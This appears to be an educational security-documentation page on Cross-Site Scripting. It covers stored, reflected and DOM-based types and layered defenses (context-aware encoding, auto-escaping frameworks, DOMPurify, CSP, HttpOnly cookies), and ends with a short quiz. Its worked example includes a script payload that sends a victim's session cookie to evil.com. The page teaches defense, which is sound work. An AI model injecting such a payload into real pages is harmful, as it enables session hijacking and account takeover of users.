---
id: xss
title: Cross-Site Scripting (XSS)
sidebar_position: 4
sidebar_label: Cross-Site Scripting
description: Injection where the interpreter is the victim's browser — the three XSS types, what an attacker does with it, and the layered defense (output encoding, frameworks, CSP).
---

# Cross-Site Scripting (XSS)

> **In one line:** **XSS** is injection where the abused interpreter is the *victim's browser* — an attacker gets their JavaScript to run on your page in someone else's session, letting them steal sessions, act as the victim, or rewrite the page — and the defense is to treat all user data as *data* on output (context-aware encoding), backed by a safe framework and a Content-Security-Policy.

:::tip[In plain English]
Your browser trusts the code that comes from a website — it runs that site's JavaScript with full access to the page, the cookies, and anything you're logged into. **Cross-Site Scripting** is when an attacker sneaks *their* JavaScript into a page so your browser runs it as if the site sent it. Imagine a comment box that shows comments to other visitors: if someone posts a "comment" that's actually a `<script>`, and the site displays it raw, then every visitor's browser runs the attacker's script — in *their* logged-in session. The attacker didn't hack the server; they hacked everyone who views the page, by getting the trusted site to deliver untrusted code. It's the same root flaw as SQL injection (data treated as code), just aimed at the browser instead of the database.
:::

## Why the browser is the target

A web page is HTML and JavaScript that the browser **executes with the site's privileges**: the script can read the page's contents, access cookies and tokens (unless protected), make requests *as the logged-in user*, and change what the user sees. The browser's whole security model — the **same-origin policy** — assumes the code on `yourbank.com` was *put there by yourbank.com*. XSS breaks that assumption: the attacker's code arrives *via* the trusted site, so the browser runs it with the site's trust.

The mechanism is identical to [injection](./injection): untrusted input is placed into a page **without being kept as data**, so the browser parses part of it as executable markup/script.

```
Page builds HTML by concatenation:
   "<div>Welcome, " + userName + "</div>"
                       ▲
   userName = "<script>steal(document.cookie)</script>"  → browser executes it
```

:::note[Terms, defined once]
- **Same-origin policy** — the browser rule that code from one origin (scheme+host+port) can't freely read another's data. XSS runs *within* the trusted origin, bypassing it.
- **Session hijacking** — stealing a user's session token/cookie to impersonate them. A top goal of XSS.
- **Output encoding (escaping)** — converting characters so the browser shows them as *text* instead of interpreting them as markup (e.g., `<` → `&lt;`). The primary XSS defense, and it's **context-dependent**.
- **Content-Security-Policy (CSP)** — an HTTP header that restricts what scripts a page may run (e.g., "no inline scripts, only scripts from these origins"), limiting XSS impact even if a hole exists.
- **HttpOnly cookie** — a cookie flag that makes a cookie unreadable to JavaScript, so XSS can't steal it directly.
- **Sink** — a place in code where data gets written into the page (e.g., `innerHTML`). Dangerous sinks are where DOM XSS happens.
:::

## The three types of XSS

XSS is categorized by *how the malicious script reaches the victim*:

1. **Stored (persistent) XSS** — the payload is *saved* on the server (in a comment, profile name, support ticket) and served to everyone who views that content. The most dangerous, because it hits every viewer automatically and can self-propagate (an XSS "worm").
2. **Reflected XSS** — the payload is in the *request* (a URL parameter, a search term) and "reflected" straight back into the response. The attacker must lure the victim into clicking a crafted link, so it's targeted rather than broadcast.
3. **DOM-based XSS** — the injection happens entirely in the *browser*: client-side JavaScript takes attacker-controlled input (e.g., from the URL fragment) and writes it into a dangerous DOM **sink** like `innerHTML`, without the server ever being involved.

:::note[Worked example: stored XSS stealing a session]
A site shows display names without encoding. The attacker sets their display name to:

```html
<script>fetch('https://evil.com/c?'+document.cookie)</script>
```

Now every user who loads a page showing that name has their browser run the script, sending their session cookie to `evil.com`. The attacker pastes a stolen cookie into their own browser and is **logged in as that victim** — no password needed. If an *admin* views it, the attacker gets admin. Because it's *stored*, it fires for every viewer until removed. This single mistake — rendering a user-supplied string as HTML — turns one input field into account takeover at scale.
:::

## The layered defense

There's no single switch; XSS is defended in [depth](/docs/foundations/defense-in-depth), with the first layer doing most of the work:

**1. Context-aware output encoding (the primary defense).** When you put data into a page, encode it for *where it's going*. The catch beginners miss: **the right encoding depends on the context.**

| Where the data lands | Example | Encoding needed |
|----------------------|---------|-----------------|
| HTML body text | `<div>HERE</div>` | HTML-encode (`<`→`&lt;`) |
| HTML attribute | `<img alt="HERE">` | Attribute-encode + quote |
| Inside a `<script>` / JS | `var x = "HERE"` | JavaScript-encode (or don't do this) |
| URL parameter | `<a href="?q=HERE">` | URL-encode |

The same string is safe in one context and dangerous in another, which is exactly why you let a framework handle it rather than hand-encoding.

**2. Use a framework that auto-escapes (the practical default).** Modern UI frameworks — React, Angular, Vue — **escape interpolated values by default**. `{userName}` in React renders as text, not markup. This is why XSS is far rarer in framework apps — *until* a developer reaches for the explicit escape hatch:

:::caution[The escape hatches that reintroduce XSS]
Frameworks are safe by default but offer "render this as raw HTML" bypasses you must treat as dangerous:
- React: `dangerouslySetInnerHTML` (the name is a warning)
- Vue: `v-html`
- Angular: `bypassSecurityTrustHtml`
- Vanilla JS: `element.innerHTML = userInput`, `document.write`, `eval`

Any user data flowing into these is a likely XSS. If you must render user-supplied HTML (a rich-text editor), **sanitize it first** with a vetted library like **DOMPurify** — never trust it raw.
:::

**3. Content-Security-Policy (the safety net).** A CSP header tells the browser "only run scripts from these sources; block inline scripts." Even if an XSS payload lands, a strict CSP can stop it from executing — a true defense-in-depth layer that limits blast radius when the first layer fails.

**4. HttpOnly + Secure cookies (limit the loot).** Marking session cookies `HttpOnly` makes them unreadable to JavaScript, so even successful XSS can't directly exfiltrate them. It doesn't stop XSS, but it removes the easiest prize.

:::info[Highlight: input validation is NOT the main XSS fix]
A common misconception is that XSS is fixed by validating input. Validation helps, but the authoritative fix is **on output**, because the *same* data is dangerous in some contexts and safe in others, and you often can't know at input time where it'll be rendered. Encode for the context at the moment you write data into the page. (Compare injection, fixed at the *query*, not the input — same principle: fix it at the boundary where data meets the interpreter.)
:::

## Why it matters

- **It's pervasive and high-impact.** XSS is one of the most reported web vulnerabilities; it leads to session hijacking, account takeover, credential theft, and defacement — and stored XSS scales to every viewer.
- **It targets your users, not just your server.** Unlike many bugs, XSS weaponizes *trust in your site* against your own users, which makes it a reputational and legal problem as well as a technical one.
- **It cements the injection mental model.** Different interpreter (browser), same flaw and same fix shape (keep data as data at the boundary). If injection and XSS both click, you understand the most important bug family on the web.

## Common pitfalls

:::caution[Where people commonly trip up]
- **Relying on input filtering alone.** Encode on *output*, in the correct context. Input validation is a helpful extra layer, not the fix.
- **Encoding for the wrong context.** HTML-encoding data that lands inside a `<script>` block or a URL doesn't protect it. Use context-aware encoding (let the framework do it).
- **Using a framework's raw-HTML escape hatch on user data.** `dangerouslySetInnerHTML`, `v-html`, `innerHTML` = re-opened XSS. Sanitize with DOMPurify if you truly must render user HTML.
- **Forgetting DOM XSS.** Server-side encoding won't save you if client-side JS writes URL data into `innerHTML`. Audit DOM sinks too.
- **No CSP, no HttpOnly.** Skipping the defense-in-depth layers means any single encoding miss becomes full session theft. Add a strict CSP and `HttpOnly`/`Secure` cookies.
- **Trusting "rich text" or markdown rendering.** User-supplied markup that's rendered to HTML is an XSS vector unless sanitized — markdown can embed raw HTML/script.
:::

## Page checkpoint

<Quiz id="xss-page" title="Did XSS click?" sampleSize={3}>

<Question
  prompt="What makes XSS dangerous — what does the attacker's injected JavaScript get access to?"
  options={[
    { text: "Nothing; JavaScript is sandboxed away from the page" },
    { text: "It runs with the trusted site's privileges in the victim's session — it can read the page, access cookies/tokens, and act as the logged-in user" },
    { text: "Only the attacker's own browser" },
    { text: "The server's filesystem directly" }
  ]}
  correct={1}
  explanation="The browser runs page scripts with the site's origin privileges. XSS smuggles the attacker's script in via the trusted site, so it executes in the victim's session — enabling session theft, acting as the user, and page manipulation."
  revisit={{ to: "/docs/appsec/xss#why-the-browser-is-the-target", label: "Why the browser is the target" }}
/>

<Question
  prompt="An attacker sets their profile display name to a <script> tag, the site renders names without encoding, and every viewer's browser runs it. Which XSS type is this?"
  options={[
    { text: "Reflected XSS" },
    { text: "Stored (persistent) XSS — the payload is saved server-side and served to everyone who views it" },
    { text: "DOM-based XSS" },
    { text: "It's not XSS" }
  ]}
  correct={1}
  explanation="The payload is stored on the server (the profile name) and served to all viewers automatically — stored XSS, the most dangerous type because it hits every viewer and can self-propagate. Reflected requires a crafted link per victim; DOM-based happens purely client-side."
  revisit={{ to: "/docs/appsec/xss#the-three-types-of-xss", label: "The three types" }}
/>

<Question
  prompt="What is the PRIMARY, authoritative defense against XSS?"
  options={[
    { text: "Validating input to remove the word 'script'" },
    { text: "Context-aware output encoding — escaping data for the exact place it's rendered — typically handled by an auto-escaping framework" },
    { text: "Using HTTPS" },
    { text: "Renaming cookies" }
  ]}
  correct={1}
  explanation="XSS is fixed on OUTPUT: encode data for the context where it's written (HTML body, attribute, JS, URL). The same data is safe in one context and dangerous in another, so auto-escaping frameworks (React/Vue/Angular) are the practical default. Input filtering is a secondary layer."
  revisit={{ to: "/docs/appsec/xss#the-layered-defense", label: "The layered defense" }}
/>

<Question
  prompt="A React developer renders user-supplied content with `dangerouslySetInnerHTML`. Why is this risky, and what should they do if they truly need to render user HTML?"
  options={[
    { text: "It's fine; React always escapes everything" },
    { text: "It bypasses React's auto-escaping and re-opens XSS; if user HTML must be rendered, sanitize it first with a vetted library like DOMPurify" },
    { text: "It only affects server performance" },
    { text: "They should disable JavaScript" }
  ]}
  correct={1}
  explanation="Frameworks are safe by DEFAULT, but raw-HTML escape hatches (dangerouslySetInnerHTML, v-html, innerHTML) opt out of escaping. User data through them is likely XSS. Sanitize with DOMPurify before rendering untrusted HTML."
  revisit={{ to: "/docs/appsec/xss#the-layered-defense", label: "Framework escape hatches" }}
/>

<Question
  prompt="What does a Content-Security-Policy (CSP) contribute as an XSS defense?"
  options={[
    { text: "It encodes output automatically" },
    { text: "It's a defense-in-depth safety net: even if a payload lands, a strict CSP can block it from executing (e.g., no inline scripts, only allowed sources), limiting blast radius" },
    { text: "It validates all input" },
    { text: "It replaces the need for output encoding" }
  ]}
  correct={1}
  explanation="CSP restricts what scripts the browser will run. It doesn't fix the underlying bug, but as a layer it can stop an injected script from executing when an encoding miss slips through — classic defense in depth. Pair it with HttpOnly cookies to limit the loot."
  revisit={{ to: "/docs/appsec/xss#the-layered-defense", label: "CSP" }}
/>

</Quiz>

## What's next

→ Continue to [Broken Authentication](./broken-authentication) — we shift from "untrusted input as code" to the other great application-layer cluster: *identity*. First, proving *who* a user is, and how that goes wrong.

→ **Going deeper:** the cookie flags and session mechanics XSS abuses are detailed in [broken authentication](./broken-authentication); CSP and secure headers are part of [secure-by-default patterns](./defensive-patterns).
